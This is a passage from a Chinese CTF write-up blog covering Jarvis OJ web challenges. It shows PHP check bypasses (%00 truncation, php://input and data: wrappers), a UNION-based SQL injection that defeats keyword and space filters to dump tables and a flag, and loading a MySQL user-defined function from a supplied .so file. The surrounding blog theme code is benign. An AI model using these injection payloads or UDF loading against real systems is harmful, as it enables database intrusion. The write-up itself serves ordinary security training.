+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id可以用弱类型来解决 id=<span class="number">0</span>b</span><br><span class="line">eregi函数可以用<span class="comment">%00截断 b=%0011111</span></span><br><span class="line">难点在于a,可用php://input,然后post数据<span class="number">1112</span> is a nice lab!</span><br><span class="line">也可以data协议a=data:,<span class="number">1112</span> is a nice lab!</span><br><span class="line"></span><br><span class="line">#返回： Come ON!!! &#123;/^HT2mCpcvOLf&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然而这并不像flag,而是路径，访问之自动跳到<a href="http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1</a></p>
+<blockquote>
+<p>回显:hi666</p>
+</blockquote>
+</li>
+<li><p>更改id发现</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=2</span><br><span class="line">回显:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">content</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">2</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span> <span class="comment">#</span></span><br><span class="line">回显:you bad boy/girl!</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>明显的sql注入了,而且过滤了很多关键字和空格，尝试用双写和/*1*/代替</p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br><span class="line">到这回显<span class="number">3</span>，说明有<span class="number">3</span>个字段</span><br><span class="line"></span><br><span class="line">查库:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,database()<span class="meta">#</span></span><br><span class="line">回显:test</span><br><span class="line"></span><br><span class="line">查表:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>group_concat(table_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>information_schema.tables<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_schema=database())%<span class="number">23</span></span><br><span class="line">回显:content</span><br><span class="line"></span><br><span class="line">查列:<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>group_concat(column_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>information_schema.columns<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_name=<span class="number">0x636f6e74656e74</span>)%<span class="number">23</span></span><br><span class="line">回显:<span class="keyword">id</span>,context,title</span><br><span class="line"></span><br><span class="line">查内容:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>context<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>content)%<span class="number">23</span></span><br><span class="line">回显:PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h2><blockquote>
+<p>咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p>
+</blockquote>
+<ol>
+<li>这道题完全复现别人的，挺有意思的，没有链接，只给了一个文件<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">udf.so.02f8981200697e5eeb661e64797fc172</a></li>
+<li><p>关于UDF的介绍</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UDF是mysql的一个拓展接口，UDF（Userdefined <span class="function"><span class="keyword">function</span>）可翻译为用户自定义函数，这个是用来拓展<span class="title">Mysql</span>的技术手段。</span></span><br><span class="line"></span><br><span class="line">简单来说，udf是为了拓展功能而可以自行添加函数，不过添加的函数为恶意函数就能导致代码执行。</span><br><span class="line"></span><br><span class="line">OK，返回题目，题目给出的提示是“不过里面有个help_me函数挺有意思的哦”，那就是说这里需要创建自定义函数了。</span><br><span class="line"></span><br><span class="line">创建自定义函数的语法：<span class="built_in">create</span> <span class="function"><span class="keyword">function</span> 函数名 <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> ‘导出的<span class="title">DLL</span>路径’；</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在Ubuntu上下载文件</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">https:</span><span class="comment">//dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>拷贝至/usr/lib/mysql/plugin,然后启动mysql服务并登陆</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service mysql <span class="literal">start</span></span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建题目提示的自定义函数并访问</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function help<span class="emphasis">_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';</span></span><br><span class="line"><span class="emphasis">ERROR 1125 (HY000): Function 'help_</span>me' already exists</span><br><span class="line">mysql&gt; select help<span class="emphasis">_me();</span></span><br><span class="line"><span class="emphasis">+---------------------------------------------+</span></span><br><span class="line"><span class="emphasis">| help_</span>me()                                   |</span><br><span class="line"><span class="code">+---------------------------------------------+</span></span><br><span class="line">| use getflag function to obtain your flag!!</span><br><span class="line"><span class="code"> |</span></span><br><span class="line"><span class="code">+---------------------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function getflag returns string soname <span class="emphasis">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select getflag();</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| getflag()                                |</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| PCTF&#123;Interesting<span class="emphasis">_U5er_</span>d3fined<span class="emphasis">_Function&#125;</span></span><br><span class="line"><span class="emphasis"> |</span></span><br><span class="line"><span class="emphasis">+------------------------------------------+</span></span><br><span class="line"><span class="emphasis">1 row in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><p>今天就写到这把，题目不难，很基础算开学初找下手感把。<del>其实还是太累了不想做啊</del></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    
+	<div>
+	
+		﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	
+	</div>
+	
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/国赛2019初赛部分WP/" rel="next" title="国赛2019初赛部分WP">
+                <i class="fa fa-chevron-left"></i> 国赛2019初赛部分WP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Cy9nus">
+            
+              <p class="site-author-name" itemprop="name">Cy9nus</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Cy9nusG4rd3n" title="GitHub &rarr; https://github.com/Cy9nusG4rd3n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:595318589@qq.com" title="E-Mail &rarr; mailto:595318589@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/" title="Weibo &rarr; https://weibo.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://plus.google.com/" title="Google &rarr; https://plus.google.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+            </div>
+          
+		  <div id="music163player">
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34341308&auto=1&height=66"></iframe>
+</div>
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PORT51"><span class="nav-number">1.1.</span> <span class="nav-text">PORT51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">1.2.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login"><span class="nav-number">1.3.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">1.4.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IN-A-MESS"><span class="nav-number">1.5.</span> <span class="nav-text">IN A MESS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">1.6.</span> <span class="nav-text">RE?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#end"><span class="nav-number">1.7.</span> <span class="nav-text">end</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cy9nus</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共9.1k字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.6" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'g6m8NJreyw7EDEGnHk5jtKwq-gzGzoHsz',
+        appKey: 'evJGU4bX7K62eAyT9bH4eNUn',
+        placeholder: '到此一游？',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: false
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
